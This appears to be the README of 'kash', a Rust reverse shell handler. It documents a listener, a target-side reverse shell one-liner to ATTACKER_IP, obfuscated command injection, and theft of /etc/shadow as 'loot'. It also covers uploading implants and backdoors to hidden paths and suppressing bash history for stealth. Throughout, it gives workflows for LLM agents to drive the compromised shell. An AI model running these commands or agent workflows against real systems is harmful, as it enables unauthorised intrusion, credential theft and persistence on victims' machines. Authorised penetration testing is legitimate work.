# kash

A reverse shell handler written in Rust. Designed for ergonomic human use and LLM/agent automation simultaneously — both share the same live shell session without conflict. Start a listener in the background with `-d`, then attach interactively from any terminal — like `docker run -d` / `docker exec -it`.

---

## Quick start

```bash
# Background listener — terminal freed immediately
kash listen 4444 -d
#   obfuscation  : none
#   session id   : monkey
#   [*] listening in background — attach with: kash attach monkey

# On the target:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Attach interactively from any terminal (raw PTY passthrough, vim/htop work):
kash attach monkey

# From another terminal (or LLM): inject commands into the live session
kash exec monkey whoami
```

### Interactive mode (no -d)

```bash
# Drop into the session directly — Terminal 1 becomes the interactive console
kash listen 4444

# Leave without closing the connection (CTRL+Q → handler mode → detach):
# The process auto-suspends; type 'bg' in your shell to resume in background.
# Then reconnect from any terminal:
kash attach monkey
```

---

## Subcommands

### `listen`

Start a TCP listener and drop into an interactive shell session when a reverse connection arrives.

```
kash listen <PORT> [OPTIONS]
```

| Argument / Flag | Default | Description |
|---|---|---|
| `PORT` | *(required)* | TCP port to bind |
| `-l, --listen <ADDR>` | `0.0.0.0` | Bind address |
| `-o, --obfuscation <LEVEL>` | `none` | Obfuscation level: `none` \| `light` \| `medium` \| `heavy` |
| `-s, --shell <TYPE>` | `auto` | Shell type: `auto` \| `linux` \| `windows` |
| `--session <ID>` | *(random animal name)* | Pin a custom session ID instead of generating one |
| `-d, --daemon` | off | Background the listener immediately; reconnect with `attach` (Unix only) |

Examples:
```bash
kash listen 4444
kash listen 4444 -d                        # background immediately
kash listen 4444 -o light -s linux
kash listen 443 -l 10.0.0.5 --session mysession
kash listen 443 -d --session mysession     # pinned ID, daemonized
```

The session ID is printed in the startup banner and used by all other subcommands.

By default the ID is a short animal name (`monkey`, `tiger`, `panda`, …) picked from a built-in list — short enough to type by hand. Names already used by an active session are skipped, so two sessions never share an animal; if the whole list is taken, a numeric suffix is added (`tiger2`). Use `--session <id>` to pin a specific name.

---

### `ps`

List all active shell sessions on this host.

```
kash ps [OPTIONS]
```

| Flag | Description |
|---|---|
| `-q, --quiet` | Print only session IDs, one per line — machine-readable |
| `--json` | Output a JSON array with full session metadata |

Examples:
```bash
kash ps
# SESSION     PEER                    IDENTITY              OBFUSCATION  SHELL
# monkey      192.168.1.100:55705     www-data@targetbox    heavy        linux

kash ps -q
# monkey

kash ps --json
# [{"id":"monkey","peer":"192.168.1.100:55705","user":"www-data","host":"targetbox","obfuscation":"heavy","shell":"linux"}]
```

Session detection works by scanning `/tmp/.shh-*.sock`. No daemon is needed.

---

### `exec`

Inject a command into a running session and return its output. This is the primary interface for LLM/agent automation.

```
kash exec [OPTIONS] <SESSION-ID> [--cmd <CMD> | <COMMAND...>]
```

| Argument / Flag | Default | Description |
|---|---|---|
| `SESSION-ID` | *(required)* | Target session ID |
| `-c, --cmd <CMD>` | — | **Exact command string** sent to the remote shell — no token splitting. Use for any command with quotes, pipes, or shell syntax. Takes priority over trailing tokens. |
| `COMMAND...` | — | Simple command as space-separated tokens (joined with spaces). Sufficient for commands that contain no shell metacharacters. |
| `--format <FORMAT>` | `text` | Output format: `text` \| `json` |

#### Which form to use

**Use `--cmd` whenever the command contains quotes, semicolons, pipes, or other shell metacharacters.** Trailing tokens are convenient for simple commands but cannot preserve quoting context.

```bash
# Simple commands — trailing tokens are fine
kash exec monkey whoami
kash exec monkey ls -la /etc

# Complex commands — always use --cmd
kash exec monkey --cmd "python3 -c \"print('hello')\""
kash exec monkey --cmd "cat /etc/passwd | grep root"
kash exec monkey --cmd "for f in /tmp/*.txt; do echo \$f; done"

# JSON output — designed for LLM consumption
kash exec --format json monkey --cmd "id"
# {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}

kash exec --format json monkey cat /etc/passwd
# {"output":"root:x:0:0:root:/root:/bin/bash\n...","exit_code":0}
```

#### Why `--cmd` exists: the two-shell quoting problem

Every command passes through **two** shells: the LLM's shell (which processes the arguments to `kash`) and the **remote target shell** (which executes the decoded, deobfuscated command). Single quotes in particular are fragile:

```
kash exec monkey "python3 -c print('test')"
                           ↓
  Your shell strips outer "…" — ok, one argument
                           ↓
  kash joins tokens → python3 -c print('test')
                           ↓
  Obfuscation encodes it → eval "$(echo '...' | base64 -d)"
                           ↓
  Remote bash decodes → python3 -c print('test')
  Remote bash consumes single quotes → Python gets print(test) → NameError ✗
```

With `--cmd` and correct quoting for the **remote shell**:

```
kash exec monkey --cmd "python3 -c \"print('hello')\""
                           ↓
  Your shell strips outer "…", keeps \" as " → python3 -c "print('hello')"
                           ↓
  kash passes this string to obfuscation unchanged
                           ↓
  Remote bash decodes → python3 -c "print('hello')"
  Remote bash processes inner "…" → Python gets print('hello') → ok ✓
```

#### LLM subprocess pattern (recommended)

When an LLM calls kash as a subprocess (no intermediate shell), pass the command as a single `--cmd` argument. The string is taken verbatim — no escaping needed beyond what the remote shell requires:

```python
subprocess.run([
    "kash", "exec", session_id,
    "--cmd", "python3 -c \"print('hello')\"",
    "--format", "json",
])
```

Behaviour:
- The command is obfuscated at the same level configured when `listen` was started.
- Output is collected until a nonce-based sentinel (`SH_CMD_DONE_<nonce>:$?`) appears in the remote output, then returned.
- If the session is busy with another `exec`, this call returns immediately with exit code `1` and an error message in `output`.
- The interactive TUI shows `[>] agent: <cmd>` when a command is injected, and `[agent running...]` while waiting.
- The human operator can press **CTRL+C** to cancel a running `exec` (exit code `130`).

---

### `inspect`

Show detailed metadata for a single session, including timing and command history.

```
kash inspect <SESSION-ID>
```

Example output:
```
  Session       monkey
  Peer          192.168.1.100:55705
  Identity      www-data@targetbox
  Obfuscation   heavy
  Shell         linux

  Started       2026-07-01 14:30:22 UTC  (42m ago)
  Commands      17
  Last cmd      cat /etc/passwd  (8m ago)
```

Fields shown only in `inspect` (not in `ps`):

| Field | Description |
|---|---|
| `Started` | UTC timestamp when the session was established, plus relative elapsed time |
| `Commands` | Total number of commands run (both interactive and via `exec`) |
| `Last cmd` | The most recent command text and how long ago it was run |

---

### `kill`

Terminate a running session gracefully.

```
kash kill <SESSION-ID>
```

Sends a kill signal over the IPC socket. The interactive session prints a notice and exits cleanly. Socket and metadata files are removed automatically.

---

### `attach`

Re-attach an interactive terminal to a detached session.

```
kash attach <SESSION-ID>
```

Example:
```bash
kash attach monkey
# [+] attached to session monkey  ·  CTRL+Q to detach
```

- Enters raw PTY passthrough mode immediately — all keystrokes forwarded byte-for-byte.
- **CTRL+Q** / **CTRL+]** detach from the session and return you to your local shell. The session keeps running.
- Terminal resize events are synced automatically via `stty cols W rows H`.
- Only one interactive client at a time. A second `attach` while one is active is rejected (connection closes immediately).
- Agent commands (`exec`) are blocked while an interactive client is attached; they return exit code 1 with an error message.

See also: **detach** meta-command in handler mode below.

---

### `upload`

Upload a local file to the remote system via a running session.

```
kash upload <SESSION-ID> <LOCAL> [REMOTE]
```

| Argument | Default | Description |
|---|---|---|
| `SESSION-ID` | *(required)* | Target session ID |
| `LOCAL` | *(required)* | Local file path to upload |
| `REMOTE` | *(local filename in cwd)* | Remote destination path |

Examples:
```bash
kash upload monkey ./implant.elf /tmp/.x
kash upload monkey loot.txt              # → ./loot.txt on remote
```

Runs the full file transfer protocol (base64 heredoc + SHA256 verification) through the session's live TCP connection. Progress and result are shown in the interactive session terminal. The exit code is `0` on success, `1` on failure.

---

### `download`

Download a file from the remote system via a running session.

```
kash download <SESSION-ID> <REMOTE> [LOCAL]
```

| Argument | Default | Description |
|---|---|---|
| `SESSION-ID` | *(required)* | Target session ID |
| `REMOTE` | *(required)* | Remote file path |
| `LOCAL` | *(remote filename in cwd)* | Local destination path |

Examples:
```bash
kash download monkey /etc/passwd
kash download monkey /etc/shadow loot/shadow.txt
```

---

## Interactive shell

When a reverse connection arrives, the handler automatically upgrades the remote to a PTY (via `python3 pty.spawn`, `python pty.spawn`, or `script`) and enters **raw PTY passthrough** mode. Every keystroke is forwarded byte-for-byte; all ANSI sequences, cursor movement, tab-completion, vim, htop, python3 REPL, and SSH all work out of the box.

Meta-commands (`upload`, `download`, `detach`, `help`, `clear`) are intercepted locally and work **directly in raw PTY mode** — just type them like any other command and press Enter. No mode switching required. Press **CTRL+Q** to drop into **handler mode** (line-editor with history) when you want it; type `pty` to return to raw PTY mode.

### Prompt

The interactive prompt shows the obfuscation level badge (evil-winrm style) and remote identity:

```
*SH[H]* www-data@victim »     ← heavy  (red)
*SH[M]* user@target »         ← medium (yellow)
*SH[L]* root@host »           ← light  (green)
*SH* user@host »              ← none   (dim)
```

### Identity probe

On connect, the handler sends:
```bash
printf 'SHIDENTITY:%s:%s\n' "$(whoami)" "$(hostname -s)"
```
and waits up to 2 seconds for the response. The resolved `user` and `host` are stored in the session metadata.

### Meta-commands

The following commands are interpreted locally — not sent to the remote shell. They work in both **raw PTY mode** (the default) and **handler mode** (CTRL+Q).

| Command | Description |
|---|---|
| `help` | Show help |
| `clear` | Clear the screen |
| `download <remote> [local]` | Stream a file from the target; SHA256 verified |
| `upload <local> <remote>` | Stream a file to the target; SHA256 verified |
| `detach` | Release the local terminal while keeping the TCP connection alive |
| `pty` | *(handler mode)* Switch to raw PTY passthrough |
| `upgrade` | *(handler mode)* Re-send PTY upgrade payload, then switch to raw PTY mode |

### Detach / attach workflow

Two ways to leave a session without closing the TCP connection:

**Recommended: start in daemon mode from the beginning**

```bash
# Listener runs in background — terminal freed immediately
kash listen 9001 -d
#   session id   : monkey
#   [*] listening in background — attach with: kash attach monkey

# Attach from any terminal whenever you need interactive access
kash attach monkey
# [+] attached to session monkey  ·  CTRL+Q to detach

# Detach with CTRL+Q — session keeps running, terminal returned immediately
# Re-attach any number of times from any terminal
```

**Fallback: `detach` meta-command from an interactive session**

If you started without `-d` and want to leave:

```bash
# Type directly at the shell prompt (raw PTY or handler mode):
detach
# [*] session monkey detached
#     ├ type 'bg' in your shell to resume in background
#     └ kash attach monkey to reconnect

# The process auto-suspends (SIGTSTP) — your shell shows it stopped.
# Type 'bg' once to resume it in the background:
bg
# Then from any terminal:
kash attach monkey
```

While detached (either way):
- The TCP connection stays alive — the remote shell keeps running.
- `kash exec` and `kash ps/inspect` work normally.
- Incoming TCP output is silently drained so the remote shell never stalls on a full buffer.

### Auto-upgrade on connect

For Linux/Auto shell types, the handler automatically runs:
```bash
stty cols W rows H; python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
  python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
  script -qc /bin/bash /dev/null 2>/dev/null
```
immediately after the identity probe. If all fallbacks fail (minimal container, no python3, no script), you get raw passthrough on the dumb pipe — interactive programs won't have full PTY semantics, but basic commands work. Run `upgrade` manually to retry.

Windows targets (`-s windows`) skip the auto-upgrade and use line-editor mode.

### Multiline commands

Press **Alt+Enter** to insert a literal newline in the line editor. The display wraps correctly across terminal columns; pressing **Enter** submits the entire buffer as one command. Useful for one-liner Python scripts:

```
python3 -c "
import os, socket
print(os.getuid())
"
```

### Keyboard shortcuts

#### Raw PTY mode (default)

All keystrokes are forwarded byte-for-byte to the remote. Meta-commands (`upload`, `download`, `detach`, `help`, `clear`) are intercepted when typed as a complete line — the remote's input buffer is cleared with CTRL+U before executing locally. The only other locally-handled keys are:

| Key | Action |
|---|---|
| **CTRL+Q** | Switch to handler (line-editor) mode |
| **CTRL+]** | Switch to handler mode (US keyboard variant) |
| **CTRL+L** | Clear screen locally + send `\x0c` to remote |

#### Handler (line-editor) mode

| Key | Action |
|---|---|
| **CTRL+C** | Send interrupt (`\x03`) to the remote process. Press **twice** to disconnect the session. |
| **CTRL+Z** | Send suspend (`\x1a`) to the remote process |
| **CTRL+L** | Clear screen |
| **CTRL+D** | Send EOF (`\x04`) to the remote — exits python3 REPL, exits bash gracefully |
| **CTRL+A** / **Home** | Jump to start of line |
| **CTRL+E** / **End** | Jump to end of line |
| **CTRL+U** | Kill to start of line |
| **CTRL+K** | Kill to end of line |
| **CTRL+W** | Kill word backward |
| **↑ / ↓** | History navigation (up to 1000 entries, no consecutive duplicates) |
| **Alt+Enter** | Insert newline (multiline input) |

#### Attach mode (`kash attach`)

All keystrokes are forwarded byte-for-byte, same as raw PTY mode. The only locally-handled keys are:

| Key | Action |
|---|---|
| **CTRL+Q** | Detach from the session and return to your local shell |
| **CTRL+]** | Detach (US keyboard variant) |

---

## Obfuscation levels

| Level | Technique |
|---|---|
| `none` | Commands sent verbatim — no encoding. **Default.** Multiline commands and complex python one-liners work correctly. |
| `light` | `""` injection between characters, optional trailing junk comment |
| `medium` | Random variant: temp-file eval, base64 decode, printf hex, rev-reverse, `$0 -c` |
| `heavy` | Random variant: double/triple base64, `/dev/shm` staging, printf octal, `$0` here-string |

Windows targets use pass-through regardless of level. Enable obfuscation only when needed — `light`/`medium`/`heavy` break multiline commands, and `heavy` can fail with commands that contain single quotes.

---

## Human + LLM concurrent use

A human and an LLM can operate the same live shell at the same time.

**How concurrency is managed:**

1. The interactive session owns the TCP connection.
2. LLM commands arrive via a Unix socket (`/tmp/.shh-<id>.sock`) and are serialised through an internal channel — only one can run at a time.
3. While an LLM command runs, the human sees `[agent running...]` and pressing **Enter** shows a "busy" hint instead of sending.
4. **CTRL+C** in the interactive terminal cancels the running LLM command with exit code `130`.
5. While an interactive client is attached via `kash attach`, agent commands (`exec`) are blocked and immediately return exit code `1`. Detach the interactive client first to resume automated use.

**Typical LLM workflow:**

```bash
# 1. Find available sessions
SESSION=$(kash ps -q | head -1)

# 2. Run a command and capture structured output
RESULT=$(kash exec --format json "$SESSION" --cmd "id")
# {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}

# 3. Check success by exit code
kash exec "$SESSION" --cmd "test -w /etc" && echo "writable"

# 4. Chain commands — use --cmd for anything with special chars
kash exec "$SESSION" --cmd "cat /etc/passwd | grep -v nologin"
kash exec "$SESSION" --cmd "find /var/www -name '*.php' -mtime -1"

# 5. Python one-liner (inner quotes use the remote shell's quoting rules)
kash exec "$SESSION" --cmd "python3 -c \"import os; print(os.getuid())\""
```

---

## File transfer

### Two ways to transfer files

**Interactive (in-session):** Type the command directly at the shell prompt — raw PTY mode or handler mode, no switching required. The command is intercepted locally and never reaches the remote shell's history.

```
download /etc/passwd
download /etc/shadow loot/shadow.txt
upload ./implant.elf /tmp/.x
upload ./payload.sh            # remote path defaults to ./payload.sh
```

**From another terminal or script** (via session IPC):

```bash
kash upload monkey ./implant.elf /tmp/.x
kash download monkey /etc/shadow loot/shadow.txt

# Works in LLM/agent pipelines:
kash upload "$SESSION" ./agent_payload /tmp/.backdoor
```

Both forms run the same transfer protocol through the session's live TCP connection and return the same progress display and SHA256 result.

### How it works

**Download** — streams base64-encoded output between per-transfer nonce delimiters:
```bash
if test -r '/remote/path'; then
  printf 'SHSTRT<nonce>\n'
  python3 -c '...' 2>/dev/null || base64 -w0 ... || base64 ... || openssl base64 ...
  printf 'SHEEND<nonce>\n'
else
  printf 'SHNF<nonce>\n'
fi
```
Decoded via a carry-buffer state machine that handles TCP chunk boundaries — constant memory use at any file size. 30-second idle timeout. Uses `if/else/fi` to avoid `exit 1` that would terminate the remote shell on file-not-found.

**Upload** — streams as 76-char base64 lines inside a heredoc:
```bash
stty -echo; cat > /tmp/.shh_<nonce> << '__SHUPEOF__'
<base64 line 1>
<base64 line 2>
__SHUPEOF__
python3 -c "import base64,sys;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))" < /tmp/.shh_<nonce> > '/remote/path' \
  || base64 -d /tmp/.shh_<nonce> > '/remote/path' \
  || base64 -D /tmp/.shh_<nonce> > '/remote/path'
```
Heredoc bypasses ARG_MAX — no file-size ceiling. Decoder chain (python3 → GNU base64 -d → BSD base64 -D) maximises remote compatibility. Sending and echo-drain run concurrently to prevent TCP buffer deadlock on large files.

**After every transfer**, the handler verifies integrity:
```bash
sha256sum '/remote/path' 2>/dev/null || shasum -a 256 '/remote/path' 2>/dev/null
```
The local hash is computed independently. A mismatch is shown as an error.

```
  [↓]  /etc/shadow  →  shadow.txt
  [✓]  [↓]  1.2 KB  ·  sha256 ok

  [↑]  implant.elf  →  /tmp/.x
  [↑]  4.5 MB / 4.5 MB  100%
  [✓]  [↑]  4.5 MB  ·  sha256 ok
```

### Stealth

Transfer commands are never added to the remote bash history (`set +o history` / `HISTFILE` save-restore pattern). Remote echo is suppressed via `stty -echo` before any command text is sent — only the very first line (the disable-echo command itself) is visible on the remote terminal; everything after it arrives silently.

### Requirements on the target

| Tool | Used for |
|---|---|
| `base64` | encoding / decoding (standard on all POSIX systems) |
| `sha256sum` OR `shasum -a 256` | integrity verification (GNU or BSD coreutils — optional) |
| `stty` | suppress echo during transfer (standard on all POSIX systems) |

If neither sha tool is available, transfer still completes — the hash check is skipped and `(no hash verification)` is shown.

---

## Session files

Each active session owns two files in `/tmp`, where `<id>` is the session ID (an animal name by default, e.g. `/tmp/.shh-monkey.sock`):

| File | Content |
|---|---|
| `/tmp/.shh-<id>.sock` | Unix domain socket for IPC |
| `/tmp/.shh-<id>.info` | `KEY=VALUE` metadata: `peer`, `user`, `host`, `obfuscation`, `shell`, `started`, `last_cmd`, `last_cmd_at`, `cmd_count` |

Both are deleted when the session exits via a RAII cleanup guard. If the process crashes, stale files can be removed manually; the next `listen --session <id>` will overwrite them.

---

## IPC protocol

One command per Unix socket connection:

```
client → server:   <command text>\n
server → client:   <output bytes>
                   \x00SHEX:<exit_code>\n    ← trailer (NUL byte prefix, never in real output)
```

Special commands (not run on the remote shell):

| Command | Action |
|---|---|
| `__SHHANDLER_KILL__` | Terminate the session gracefully |
| `__SHHANDLER_ATTACH__` | Upgrade to bidirectional byte relay (used by `attach`) |
| `__SHHANDLER_UPLOAD__\x00<local>\x00<remote>` | Run file upload protocol; output = `"upload complete\n"` or error |
| `__SHHANDLER_DOWNLOAD__\x00<remote>\x00<local>` | Run file download protocol; output = `"download complete\n"` or error |

Upload/download IPC commands use NUL (`\x00`) as path separator (valid in a line-delimited protocol, never a line terminator).

---

## Build

Requires Rust 1.85+ (edition 2024).

```bash
cargo build --release
# binary: target/release/kash
```
